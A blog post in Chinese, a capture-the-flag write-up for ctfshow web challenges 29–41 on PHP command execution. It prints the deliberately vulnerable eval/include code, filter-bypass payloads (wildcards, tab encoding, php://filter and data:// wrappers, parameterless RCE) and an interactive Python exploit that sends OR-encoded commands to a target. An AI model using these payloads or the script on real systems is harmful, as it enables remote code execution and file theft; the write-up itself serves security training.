@@ -1,0 +1,414 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow命令执行篇 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web29（通配符绕过）
+eval执行PHP代码，过滤了大小写的flag：
+
+123?c=system(&amp;#x27;ls&amp;#x27;);?c=system(&amp;#x27;tac f*&amp;#x27;);
+,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow命令执行篇</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow命令执行篇</h1>
+        <div class="stuff">
+            <span>八月 22, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A7%A3%E9%A2%98/" rel="tag">命令执行解题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web29（通配符绕过）"><a href="#web29（通配符绕过）" class="headerlink" title="web29（通配符绕过）"></a>web29（通配符绕过）</h3><ul>
+<li>eval执行PHP代码，过滤了大小写的flag：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">?c=system(<span class="string">&#x27;tac f*&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="web30（反引号执行系统命令）"><a href="#web30（反引号执行系统命令）" class="headerlink" title="web30（反引号执行系统命令）"></a>web30（<strong>反引号执行系统命令</strong>）</h3><p>过滤了大小写的php，system，flag</p>
+<p>使用echo，反引号执行命令输出：</p>
+<p><strong>/?c=echo <code>ls</code>;</strong></p>
+<p><strong>/?c=echo <code>tac f\*</code>;</strong></p>
+<p><img src="1.png"></p>
+<h3 id="web31（过滤空格）"><a href="#web31（过滤空格）" class="headerlink" title="web31（过滤空格）"></a>web31（过滤空格）</h3><p>过滤了如下字符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用echo命令，</p>
+<p>对于空格的过滤可以使用%09进行绕过：</p>
+<p><strong>/?c=echo%09<code>tac%09f*</code>;</strong></p>
+<p><img src="2.png"></p>
+<h3 id="web32（利用文件包含结合读取）"><a href="#web32（利用文件包含结合读取）" class="headerlink" title="web32（利用文件包含结合读取）"></a>web32（利用文件包含结合读取）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>过滤了echo和反引号，echo命令不能用，</p>
+<p><strong>使用文件包含结合php://filter协议进行读取flag.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>payload:</strong></p>
+<p><strong>?c=include$_GET[“a”]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</strong></p>
+<p><img src="3.png"></p>
+<h3 id="web33（利用文件包含结合读取）"><a href="#web33（利用文件包含结合读取）" class="headerlink" title="web33（利用文件包含结合读取）"></a>web33（利用文件包含结合读取）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在上一题的基础上<strong>过滤了双引号</strong>，直接把payload的双引号去掉即可：</p>
+<ul>
+<li><strong>payload：</strong></li>
+</ul>
+<p><strong>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</strong></p>
+<h3 id="web34-36"><a href="#web34-36" class="headerlink" title="web34-36"></a>web34-36</h3><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="都使用和33一样的payload："><a href="#都使用和33一样的payload：" class="headerlink" title="都使用和33一样的payload："></a>都使用和33一样的payload：</h4><p><strong>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</strong></p>
+<h3 id="web37（利用PHP伪协议进行读取，执行命令）"><a href="#web37（利用PHP伪协议进行读取，执行命令）" class="headerlink" title="web37（利用PHP伪协议进行读取，执行命令）"></a>web37（利用PHP伪协议进行读取，执行命令）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>代码和上面的不一样，出现include函数，考虑使用PHP伪协议进行读取，首先考虑data协议，因为可以直接执行命令。</p>
+</li>
+<li><p>payload:</p>
+</li>
+</ul>
+<p><strong>?c=data: text/plain,<?php system('ls') ?></strong></p>
+<p><strong>?c=data: text/plain,<?php system('tac f*') ?></strong></p>
+<p><img src="4.png"></p>
+<ul>
+<li>也可以使用php://input进行post传参：</li>
+</ul>
+<p><img src="5.png"></p>
+<h3 id="web38（php短标签）"><a href="#web38（php短标签）" class="headerlink" title="web38（php短标签）"></a>web38（php短标签）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ul>
+<li><p>在上一题的基础上过滤了php，因此使用data协议，将后面的PHP代码使用短标签进行绕过即可：</p>
+</li>
+<li><p>payload</p>
+</li>
+</ul>
+<p><strong>?c=data:text/plain,<?= system('tac f*')?></strong></p>
+<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><p>payload和38一样。</p>
+<h3 id="web40（无参数rce-利用PHP函数执行）"><a href="#web40（无参数rce-利用PHP函数执行）" class="headerlink" title="web40（无参数rce-利用PHP函数执行）"></a>web40（无参数rce-利用PHP函数执行）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>过滤了%和=等符号，短标签无法使用。</li>
+</ul>
+<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
+<li>print_r(scandir(‘.’));查看当前目录下的所有文件名</li>
+<li>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</li>
+<li>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</li>
+</ul>
+<p>但是这题过滤了引号，不能有参数，找一个代替’.’的东西</p>
+<p>print_r(scandir(current(localeconv())));打印出当前目录下文件</p>
+<p><strong>具体参考无参数读文件和rce:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/242482.html">https://www.freebuf.com/articles/system/242482.html</a></p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ul>
+<li><strong>paylaod：</strong></li>
+</ul>
+<p><strong>?c=print_r(scandir(current(localeconv())));</strong></p>
+<p>打印出当前目录下的文件，可以看到flag.php在倒数第二个，直接用next(array_reverse());</p>
+<p><img src="6.png"></p>
+<ul>
+<li>使用show_source将文件的内容读取出来：</li>
+</ul>
+<p>payload：</p>
+<p><strong>/?c=show_source(next(array_reverse(scandir(current(localeconv())))));</strong></p>
+<p><img src="7.png"></p>
+<h3 id="web41（或运算-使用脚本解题）"><a href="#web41（或运算-使用脚本解题）" class="headerlink" title="web41（或运算-使用脚本解题）"></a>web41（或运算-使用脚本解题）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>题目过滤了$、+、-、^、~使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。</p>
+<p>留下了一个|，可进行或运算。</p>
+<p>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用字符的字符。</p>
+<h4 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h4><ul>
+<li>使用yu师傅的脚本（自己加了一些注释）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);        <span class="comment">//将小于16的数字转化为16进制存储</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);        <span class="comment">//将小于16的数字转化为16进制存储</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">    <span class="comment">//将16进制数转化为ascii码字符，判断是否存在被过滤的字符，存在则输出为空</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;    </span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));   <span class="comment">//将a和b进行或运算得到c</span></span><br><span class="line">      <span class="comment">//判断c是否为可见字符，将其输出到rce_or.txt文件中</span></span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+
+<p>从进行或运算的字符中排除掉被过滤的，然后在判断或运算得到的字符是否为可见字符：</p>
+<p>dechex() 函数把十进制转换为十六进制。</p>
+<p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
+<p>得到一个txt文档。</p>
+<ul>
+<li>再用python脚本进行命令执行（自己外加了一些注释）</li>
+</ul>
+<p><strong>用法 python exp.py <url></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#os.system(&quot;php rce_or.php&quot;)  #由于我是分开执行的，所以不需要这一步</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):      <span class="comment">#如果输入的脚本参数不是一个的话，就会打印出正确输入的形式</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]   <span class="comment">#sys.argv[1] 为脚本的第一个参数，即输入的url</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t=f.readline()</span><br><span class="line">            <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                <span class="comment">#print(i)</span></span><br><span class="line">                s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span>   <span class="comment">#如果输入的字符在上述字典中，则对其进行或运算进行输出</span></span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line">  </span><br><span class="line">   <span class="comment">#如果输进来的值在上述生成的可见字典里，都是while true 就变成一个交互式的界面，输出结果.   </span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) </span><br><span class="line">  </span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)     <span class="comment">#urllib.parse.unquote()相当于JS中的urldecode()，对url进行解码</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>exp.py  url 111 222</li>
+</ul>
+<p>Sys.argv[ ]其实就是一个列表，里边的项为用户输入的参数，关键就是要明白这参数是从程序外部输入的。</p>
+<p>sys.argv == [“exp.py”,”url”,”111”,”222”] #sys.argv是持有4个元素的list对象</p>
+<p>sys.argv[0]是代表当前所执行的脚本（exp.py）</p>
+<p>sys.argv[1] 为脚本的第一个参数，列表中的第二个元素（url）</p>
+<p>len(sys.argv)==4代表当前脚本含有3个参数</p>
+<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p><img src="8.png"></p>
+<p><img src="9.png"></p>
+<h4 id="yu师傅的脚本"><a href="#yu师傅的脚本" class="headerlink" title="yu师傅的脚本"></a>yu师傅的脚本</h4><p><a target="_blank" rel="noopener" href="https://wp.ctf.show/d/137-ctfshow-web-web41">https://wp.ctf.show/d/137-ctfshow-web-web41</a></p>
